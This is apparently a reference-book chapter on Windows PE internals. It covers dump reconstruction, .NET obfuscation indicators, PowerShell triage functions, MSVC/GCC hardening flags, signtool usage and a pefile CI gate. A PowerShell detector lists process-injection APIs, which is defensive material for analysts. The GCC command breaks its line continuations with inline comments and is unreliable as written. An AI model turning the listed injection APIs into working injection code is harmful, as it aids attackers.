### 28.5 Memory-mapped PE reconstruction from process dumps

When analyzing a running process or a memory dump, the in-memory PE differs from the on-disk PE: sections are mapped at `SectionAlignment` (page-aligned) boundaries, import thunks are resolved to live addresses, relocations have been applied, and some sections may have been modified by the runtime. Reconstructing a valid on-disk PE from a memory dump requires reversing these transformations.

Key reconstruction steps:

1. **Locate the PE header** in the dump — scan for `MZ` + valid `e_lfanew` pointing to `PE\0\0`.
2. **Fix section raw offsets.** In memory, sections are at `SectionAlignment`-aligned RVAs. On disk, they are at `FileAlignment`-aligned offsets. For each section: set `PointerToRawData = VirtualAddress` (treating the dump as file-aligned at page granularity) or repack to `FileAlignment` alignment.
3. **Rebuild the import table.** In-memory IAT entries contain resolved addresses (kernel32.dll function pointers, etc.) rather than the original RVA/ordinal hints. Use the ILT (Import Lookup Table / OriginalFirstThunk) if preserved — it is read-only and typically survives. If the ILT is destroyed, resolve addresses back to function names via module export tables from the same dump.
4. **Remove relocations.** If the image was relocated (loaded at a different base than `ImageBase`), rebase it: subtract the delta from all locations identified by the `.reloc` section entries.
5. **Fix `SizeOfRawData` for each section.** In the dump, sections occupy `VirtualSize` bytes (rounded to page alignment). The on-disk `SizeOfRawData` should match the original value. If unknown, use `min(VirtualSize, next_section_VA - this_VA)`.

Tools: Scylla (x86/x64 IAT rebuilder), PE-sieve (with `/dmode 1` for full dump), Volatility 3 `windows.malfind` + `windows.dumpfiles`, and ImpRec (legacy, x86 only).

### 28.6 .NET assembly forensics

.NET assemblies are PE files with a CLR header (data directory index 14) pointing to the CLI metadata. Forensic analysis targets the metadata tables and IL bytecode rather than native instructions.

**Metadata table forensics:**

| Table | Forensic Value |
|-------|----------------|
| `Module` (0x00) | `Mvid` (Module Version ID) — GUID that changes per compilation; useful as a variant pivot |
| `TypeRef` (0x01) | External type references — reveals dependencies on reflection, P/Invoke, WMI, registry APIs |
| `TypeDef` (0x02) | Defined types — namespace/class structure reveals architecture; obfuscated names are a red flag |
| `MethodDef` (0x06) | Method RVAs point to IL bytecode; IL disassembly reveals logic even when names are obfuscated |
| `MemberRef` (0x0A) | External method references — `Assembly.Load`, `Process.Start`, `WebClient.DownloadString` |
| `CustomAttribute` (0x0C) | `[DllImport]` for P/Invoke, `[Obfuscation]`, `[DebuggerHidden]`, `[CompilerGenerated]` |
| `ManifestResource` (0x28) | Embedded resources — may contain encrypted configs, second-stage payloads, or satellite assemblies |
| `AssemblyRef` (0x23) | Referenced assemblies with version/PublicKeyToken — dependency fingerprint |

**Obfuscation detection indicators:**
- Method and type names consisting of unprintable characters, single letters, or Unicode lookalikes.
- `TypeDef` entries with names in non-Latin scripts (Cyrillic, CJK) when the binary's culture is different.
- Empty method bodies (just `ret`) wrapping calls to dynamic dispatch (`DynamicInvoke`, `Reflection.Emit`).
- String decryption patterns: static constructor (`cctor`) that decrypts a byte array and stores results in a static field, with all string references replaced by field loads.
- Control-flow flattening: switch-based state machines in method IL where the original code used sequential logic.
- Proxy methods: trivial methods that call another method with identical parameters — inserted by obfuscators (ConfuserEx) to break cross-references.

```powershell
# PowerShell: quick .NET assembly metadata triage
function Get-DotNetMetadata {
    param([string]$Path)

    $assembly = [System.Reflection.Assembly]::LoadFile($Path)
    $name = $assembly.GetName()

    [PSCustomObject]@{
        FullName       = $name.FullName
        Version        = $name.Version
        Culture        = $name.CultureInfo.Name
        PublicKeyToken = ($name.GetPublicKeyToken() |
                         ForEach-Object { $_.ToString("x2") }) -join ''
        EntryPoint     = $assembly.EntryPoint
        Modules        = $assembly.GetModules().Name -join ', '
        TypeCount      = $assembly.GetTypes().Count
        References     = ($assembly.GetReferencedAssemblies() |
                         ForEach-Object { $_.FullName })
        Resources      = $assembly.GetManifestResourceNames()
    }
}

# Detect suspicious P/Invoke declarations
function Find-PInvoke {
    param([string]$Path)

    $assembly = [System.Reflection.Assembly]::LoadFile($Path)
    $suspicious = @('VirtualAlloc', 'VirtualAllocEx', 'WriteProcessMemory',
                    'CreateRemoteThread', 'NtUnmapViewOfSection',
                    'OpenProcess', 'ReadProcessMemory', 'VirtualProtect',
                    'CreateThread', 'RtlMoveMemory')

    foreach ($type in $assembly.GetTypes()) {
        foreach ($method in $type.GetMethods(
            [System.Reflection.BindingFlags]::Static -bor
            [System.Reflection.BindingFlags]::NonPublic -bor
            [System.Reflection.BindingFlags]::Public)) {

            $attr = $method.GetCustomAttributes(
                [System.Runtime.InteropServices.DllImportAttribute], $false)
            if ($attr.Count -gt 0) {
                $dll = $attr[0].Value
                $entry = if ($attr[0].EntryPoint) { $attr[0].EntryPoint }
                         else { $method.Name }
                $is_sus = $suspicious -contains $entry
                $flag = if ($is_sus) { "[!]" } else { "   " }
                Write-Host "$flag P/Invoke: $dll!$entry (type: $($type.Name))"
            }
        }
    }
}
```

---

## 29. PE Hardening

§23 verifies whether mitigations are present. This section documents how to apply them: the exact compiler and linker flags, the Authenticode signing workflow, CI/CD integration, and driver signing requirements.

### 29.1 Compiler and linker hardening flags

All flags below are for MSVC (`cl.exe` + `link.exe`). GCC/MinGW equivalents are noted where applicable.

| Flag | Purpose | Since |
|------|---------|-------|
| `/GS` | Stack buffer overrun detection via security cookies | VS 2003 (enabled by default since VS 2005) |
| `/DYNAMICBASE` | ASLR — sets `IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE` | VS 2005 SP1 (linker default since VS 2008) |
| `/HIGHENTROPYVA` | High-entropy 64-bit ASLR — randomizes into full 64-bit address space | VS 2012 |
| `/NXCOMPAT` | DEP — sets `IMAGE_DLLCHARACTERISTICS_NX_COMPAT` | VS 2005 SP1 (default since VS 2008) |
| `/GUARD:CF` | Control Flow Guard — generates CFG metadata, instruments indirect calls | VS 2015 |
| `/GUARD:EHCONT` | Exception handler continuation metadata for CET compatibility | VS 2019 16.7 |
| `/CETCOMPAT` | CET Shadow Stack compatibility — sets `IMAGE_DLLCHARACTERISTICS_EX_CET_COMPAT` | VS 2019 16.7 |
| `/INTEGRITYCHECK` | Force Integrity — requires valid signature at load time | VS 2005 SP1 |
| `/SAFESEH` | Safe Structured Exception Handling (x86 only) — registers valid SEH handlers | VS 2003 |
| `/GUARD:XFG` | eXtended Flow Guard — type-based CFI (forward-edge) | VS 2022 Preview |
| `/Qspectre` | Spectre v1 mitigation — inserts LFENCE at vulnerable patterns | VS 2017 15.5.5 |
| `/sdl` | Security Development Lifecycle checks — enables additional warnings and runtime checks | VS 2012 |

**Recommended build configuration (CMake):**

```cmake
# CMakeLists.txt — hardened Windows build
if(MSVC)
    # Compiler flags
    add_compile_options(
        /GS           # Stack cookies
        /sdl          # SDL checks
        /Qspectre     # Spectre mitigation
        /guard:cf     # Control Flow Guard
        /W4           # Warning level 4
        /WX           # Treat warnings as errors
    )

    # Linker flags
    add_link_options(
        /DYNAMICBASE          # ASLR
        /HIGHENTROPYVA        # 64-bit ASLR entropy
        /NXCOMPAT             # DEP
        /GUARD:CF             # CFG metadata
        /CETCOMPAT            # CET shadow stack
        /INTEGRITYCHECK       # Require valid signature
    )

    # For x86 targets
    if(CMAKE_SIZEOF_VOID_P EQUAL 4)
        add_link_options(/SAFESEH)
    endif()
endif()
```

**GCC/MinGW equivalents:**

```bash
# GCC/MinGW hardened build
gcc -o output.exe source.c \
    -fstack-protector-strong \      # Equivalent of /GS
    -Wl,--dynamicbase \             # ASLR
    -Wl,--high-entropy-va \         # High-entropy ASLR
    -Wl,--nxcompat \                # DEP
    -D_FORTIFY_SOURCE=2 \           # Buffer overflow detection
    -fcf-protection=full \          # Intel CET (IBT + Shadow Stack)
    -mshstk                         # Shadow stack instructions
```

### 29.2 Authenticode signing workflow

**Step 1: Obtain a code signing certificate.** Standard OV (Organization Validation) certificates work for most purposes. EV (Extended Validation) certificates are required for driver signing, SmartScreen immediate reputation, and kernel-mode code on Windows 10+. As of 2023-06-01, CAs must issue EV code signing certificates on hardware tokens (FIPS 140-2 Level 2 USB keys) or via cloud HSM.

**Step 2: Sign the binary.**

```cmd
:: Sign with SHA-256 digest and RFC 3161 timestamp
signtool.exe sign ^
    /fd SHA256 ^
    /tr http://timestamp.digicert.com ^
    /td SHA256 ^
    /n "Your Organization Name" ^
    /v ^
    output.exe

:: For EV certificates on hardware token (auto-prompt for PIN)
signtool.exe sign ^
    /fd SHA256 ^
    /tr http://timestamp.digicert.com ^
    /td SHA256 ^
    /sha1 <CERT_THUMBPRINT> ^
    /v ^
    output.exe

:: Dual-sign for legacy compatibility (SHA-1 + SHA-256)
:: First pass: SHA-1
signtool.exe sign ^
    /fd SHA1 ^
    /t http://timestamp.digicert.com ^
    /n "Your Organization Name" ^
    output.exe
:: Second pass: SHA-256 (append, don't replace)
signtool.exe sign ^
    /as ^
    /fd SHA256 ^
    /tr http://timestamp.digicert.com ^
    /td SHA256 ^
    /n "Your Organization Name" ^
    output.exe
```

**Step 3: Verify.**

```cmd
signtool.exe verify /pa /v output.exe
```

**Timestamp importance.** Without a timestamp, the signature becomes invalid when the certificate expires. With an RFC 3161 timestamp from a Timestamp Authority (TSA), the signature remains valid indefinitely as long as it was made while the certificate was valid. Always timestamp. Use `/tr` (RFC 3161) rather than `/t` (legacy Authenticode timestamp protocol).

### 29.3 CI/CD integration: automated PE hardening verification

Integrate mitigation checks into the build pipeline so that non-compliant binaries fail the build:

```python
#!/usr/bin/env python3
"""CI/CD gate: verify PE hardening flags. Exit non-zero if any check fails."""
import pefile
import sys
import glob
import os

REQUIRED_DLL_CHARS = {
    'DYNAMIC_BASE':    0x0040,
    'NX_COMPAT':       0x0100,
    'HIGH_ENTROPY_VA': 0x0020,
    'GUARD_CF':        0x4000,
}

def check_binary(path):
    pe = pefile.PE(path)
    failures = []

    dc = pe.OPTIONAL_HEADER.DllCharacteristics
    for name, flag in REQUIRED_DLL_CHARS.items():
        if not (dc & flag):
            failures.append(f"Missing {name} (0x{flag:04x})")

    # Check /GS (SecurityCookie in load config)
    if hasattr(pe, 'DIRECTORY_ENTRY_LOAD_CONFIG'):
        lc = pe.DIRECTORY_ENTRY_LOAD_CONFIG.struct
        if not (hasattr(lc, 'SecurityCookie') and lc.SecurityCookie != 0):
            failures.append("Missing /GS (SecurityCookie is zero)")
    else:
        failures.append("No load config directory (implies no /GS)")

    # Check Authenticode
    cert_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[4]
    if cert_dir.VirtualAddress == 0 or cert_dir.Size == 0:
        failures.append("No Authenticode signature")

    # Check relocations present (needed for effective ASLR)
    reloc_dir = pe.OPTIONAL_HEADER.DATA_DIRECTORY[5]
    stripped = bool(pe.FILE_HEADER.Characteristics & 0x0001)
    if reloc_dir.Size == 0 or stripped:
        failures.append("Relocations missing or stripped (ASLR ineffective)")

    pe.close()
    return failures

def main():
    if len(sys.argv) < 2:
        print("Usage: pe_hardening_gate.py <path_or_glob>")
        sys.exit(2)

    pattern = sys.argv[1]
    paths = glob.glob(pattern, recursive=True)
    if not paths:
        print(f"No files matched: {pattern}")
        sys.exit(2)

    total_failures = 0
    for path in paths:
        if not os.path.isfile(path):
            continue
        failures = check_binary(path)
        if failures:
            total_failures += len(failures)
            print(f"FAIL: {path}")
            for f in failures:
                print(f"  [-] {f}")
        else:
            print(f"PASS: {path}")

    if total_failures > 0:
        print(f"\n{total_failures} hardening failures detected.")
        sys.exit(1)
    else:
        print("\nAll binaries pass hardening checks.")
        sys.exit(0)

if __name__ == "__main__":
    main()
```

**Pipeline integration example (GitHub Actions):**

```yaml
# .github/workflows/pe-hardening.yml
name: PE Hardening Gate
on: [push, pull_request]
jobs:
  hardening-check:
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - name: Build
        run: cmake --build build --config Release
      - name: Install pefile
        run: pip install pefile
      - name: Check PE mitigations
        run: python ci/pe_hardening_gate.py "build/Release/*.exe"
```

### 29.4 Driver signing and HVCI compatibility

Windows kernel-mode drivers have stricter signing requirements than user-mode binaries:

**WHQL (Windows Hardware Quality Labs) signing.** Drivers submitted through the Windows Hardware Developer Center portal undergo automated testing (HLK — Hardware Lab Kit) and receive a Microsoft cross-signature. Required for drivers on Windows 10 1607+ in Secure Boot environments.

**Attestation signing.** For drivers that do not require HLK testing (e.g., development or enterprise-internal drivers), Microsoft offers attestation signing through the partner portal. The driver is submitted, scanned for malware, and receives a Microsoft signature without full HLK testing. Available for Windows 10 and later.

**HVCI (Hypervisor-protected Code Integrity) compatibility.** HVCI (also called Memory Integrity) enforces that all kernel-mode code is signed and that writable memory is never executable. A driver compatible with HVCI must:

1. Not use executable non-paged pool (`ExAllocatePool` flags without `NonPagedPoolNx`).
2. Not modify executable code pages at runtime.
3. Not execute from data pages.
4. Not contain sections with both `WRITE` and `EXECUTE` characteristics.
5. Not use specific deprecated APIs (`MmMapIoSpace` without `MmMapIoSpaceEx` with `PAGE_READWRITE`).
6. Be compiled with `/INTEGRITYCHECK` and signed with a valid certificate.
7. Be compiled with `/CETCOMPAT` for CET shadow stack compatibility on supported hardware.

**Verification:**

```cmd
:: Check driver for HVCI compatibility
dumpbin.exe /headers driver.sys | findstr /i "DLL Characteristics"
:: Look for: NX compatible, Force Integrity, Guard CF

:: Use the WDAC CI policy to test
cipolicy.exe -TestPolicy -DriverFiles "driver.sys" -Level "WHQLFilePublisher"
```

**Driver signing enforcement timeline:**

| Windows Version | Requirement |
|----------------|-------------|
| Windows Vista x64 | Kernel-mode code must be signed (any valid certificate) |
| Windows 10 1607 (Anniversary Update) | New kernel-mode drivers must be submitted to Microsoft's portal (attestation or WHQL) if Secure Boot is enabled |
| Windows 10 1703+ | Cross-signed certificates no longer accepted for new drivers on Secure Boot systems |
| Windows 11 | HVCI enabled by default on new installations; all drivers must be HVCI-compatible |

---

## 30. Cross-references for follow-on work

When you write Windows-side detections, hardening rules, or analysis tooling, the following structures bind together:

A Windows binary's hardening posture is encoded across `DllCharacteristics`, `IMAGE_DEBUG_TYPE_EX_DLLCHARACTERISTICS`, the load configuration directory's `GuardFlags` and CFG/XFG/CET tables, the certificate table (signed at all? by whom?), the resource manifest (UAC / `uiAccess` / AppContainer-aware), and `IMAGE_FILE_RELOCS_STRIPPED` together with the presence/absence of a populated `.reloc`. A useful audit reports the matrix and flags missing items per binary.

A binary's behavior surface — what it can do without further loading — is encoded in the import directory (what static dependencies), the delay-load directory (what conditional dependencies), the resource directory (`RT_RCDATA` blobs that may be embedded executables), the CLR header if managed (what reflection is possible), and the TLS callback array (what runs before `EntryPoint`). Static triage that walks all five of these gives a much fuller picture than `EntryPoint`-only disassembly.

A binary's identity is encoded in the Authenticode signature (chain to a trusted root, signing certificate identity, timestamp), the Rich header (compiler/linker provenance), the PDB GUID/Age (build-environment provenance), and `RT_VERSION` (claimed identity, untrusted). A defender reasoning about provenance should treat these in roughly that priority: signature first, build provenance second, claimed metadata last.

This concludes Domain 1: the on-disk and in-memory anatomy of executable binaries on Linux and Windows. Chapter 1B (queued) finishes the ELF half with TLS, IFUNC, init/fini ordering, security segments and CET/BTI integration, exception unwinding, build-id/ABI/debuglink notes, symbol versioning, and a deeper auxv treatment. Domain 2 picks up at process memory and OS primitives, where many of the structures introduced here become live targets.
